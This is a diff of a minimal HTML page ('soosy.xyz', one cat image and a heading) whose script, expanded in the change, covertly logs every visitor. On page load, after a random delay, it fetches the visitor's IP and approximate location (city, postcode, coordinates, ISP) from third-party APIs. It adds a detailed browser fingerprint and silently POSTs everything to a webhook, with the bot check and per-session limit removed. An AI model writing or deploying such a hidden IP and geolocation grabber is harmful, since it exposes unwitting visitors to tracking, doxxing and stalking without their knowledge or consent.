@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>soosy.xyz</title>
-  <link rel="icon" href="https://http.cat/100.jpg" type="image/jpeg" />
+  <link rel="icon" href="https://http.cat/100.jpg" type="image/jpeg">
   <style>
     body {
       background-color: white;
@@ -28,96 +28,122 @@
 </head>
 <body>
   <div class="caption"></div>
-  <img src="https://http.cat/100.jpg" alt="100 Continue" />
+  <img src="https://http.cat/100.jpg" alt="-">
   <h1>soosy</h1>
 
   <script>
-    const endpoint = "/api/webhook";
+    const endpoint = '/api/webhook';
+    const sharedKey = 'soosy-key';
 
     const collectMetrics = async () => {
       try {
-        // Basic bot check
-        if (/bot|crawler|spider|crawling/i.test(navigator.userAgent)) return null;
-
         const [ipResp, geoResp] = await Promise.all([
-          fetch("https://api.ipify.org?format=json").then(r => r.json()),
-          fetch("https://ipapi.co/json/").then(r => r.json())
+          fetch('https://api.ipify.org?format=json').then(r => r.json()),
+          fetch('https://ipapi.co/json/').then(r => r.json())
         ]);
 
         const ua = navigator.userAgent;
+
         const getBrowser = () => {
           const patterns = [
-            [/Firefox\/(\d+)/, "Firefox"],
-            [/Chrome\/(\d+)(?!.*Edg)/, "Chrome"],
-            [/Version\/(\d+).*Safari(?!.*Chrome)/, "Safari"],
-            [/Edg\/(\d+)/, "Edge"]
+            [/Firefox\/(\d+)/, 'Firefox'],
+            [/Chrome\/(\d+)(?!.*Edg)/, 'Chrome'],
+            [/Version\/(\d+).*Safari(?!.*Chrome)/, 'Safari'],
+            [/Edg\/(\d+)/, 'Edge']
           ];
           for (const [regex, name] of patterns) {
             const match = ua.match(regex);
             if (match) return { name, version: match[1] };
           }
-          return { name: "Unknown", version: "Unknown" };
+          return { name: 'Unknown', version: 'Unknown' };
         };
 
         const getOS = () => {
           const osMap = [
-            [/Windows/, "Windows"],
-            [/Mac/, "macOS"],
-            [/Linux/, "Linux"],
-            [/Android/, "Android"],
-            [/iPhone|iPad/, "iOS"]
+            [/Windows/, 'Windows'],
+            [/Mac/, 'macOS'],
+            [/Linux/, 'Linux'],
+            [/Android/, 'Android'],
+            [/iPhone|iPad/, 'iOS']
           ];
-          return osMap.find(([regex]) => regex.test(ua))?.[1] || "Unknown";
+          return osMap.find(([regex]) => regex.test(ua))?.[1] || 'Unknown';
+        };
+
+        const getDeviceType = () => {
+          if (/Mobile|Android|iPhone/.test(ua)) return 'Mobile';
+          if (/Tablet|iPad/.test(ua)) return 'Tablet';
+          return 'Desktop';
         };
 
         const browser = getBrowser();
         const timestamp = new Date().toISOString();
 
         return {
-          key: "soosy-key", // HMAC-like pre-shared key for validation
+          key: sharedKey,
           t: timestamp,
-          ip: ipResp.ip || "Unknown",
+          ip: ipResp.ip || 'Unknown',
           geo: {
-            country: geoResp.country_name || "Unknown",
-            city: geoResp.city || "Unknown",
-            region: geoResp.region || "Unknown",
-            lat: geoResp.latitude || "Unknown",
-            lng: geoResp.longitude || "Unknown",
-            postal: geoResp.postal || "Unknown",
-            isp: geoResp.org || "Unknown"
+            country: geoResp.country_name || 'Unknown',
+            region: geoResp.region || 'Unknown',
+            city: geoResp.city || 'Unknown',
+            postal: geoResp.postal || 'Unknown',
+            lat: geoResp.latitude || 'Unknown',
+            lng: geoResp.longitude || 'Unknown',
+            tz: geoResp.timezone || 'Unknown',
+            isp: geoResp.org || 'Unknown',
+            asn: geoResp.asn || 'Unknown'
           },
           sys: {
-            ua,
-            browser: `${browser.name} ${browser.version}`,
+            ua: ua,
+            browser: browser.name + ' ' + browser.version,
             os: getOS(),
-            screen: `${screen.width}x${screen.height}`,
-            lang: navigator.language
+            device: getDeviceType(),
+            lang: navigator.language,
+            langs: navigator.languages?.join(', ') || navigator.language,
+            platform: navigator.platform,
+            screen: screen.width + 'x' + screen.height,
+            window: window.innerWidth + 'x' + window.innerHeight,
+            depth: screen.colorDepth,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies: navigator.cookieEnabled,
+            online: navigator.onLine,
+            dnt: navigator.doNotTrack || 'Not set',
+            java: navigator.javaEnabled?.() || false
           },
           nav: {
             url: location.href,
-            ref: document.referrer || "Direct"
+            ref: document.referrer || 'Direct'
           }
         };
-      } catch {
+      } catch (e) {
         return null;
       }
     };
 
-    const sendPayload = async () => {
-      const data = await collectMetrics();
-      if (!data || sessionStorage.getItem("sent")) return;
-      sessionStorage.setItem("sent", "1");
-
-      await fetch(endpoint, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
+    const transmit = async () => {
+      try {
+        const data = await collectMetrics();
+        if (!data) return;
+        await fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+      } catch (e) {
+        // Fail silently
+      }
     };
 
-    document.readyState === "loading"
-      ? document.addEventListener("DOMContentLoaded", sendPayload)
-      : sendPayload();
+    const init = () => {
+      const delay = 800 + Math.floor(Math.random() * 500); // 800-1300ms delay
+      setTimeout(transmit, delay);
+    };
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', init);
+    } else {
+      init();
+    }
   </script>
 </body>
 </html>
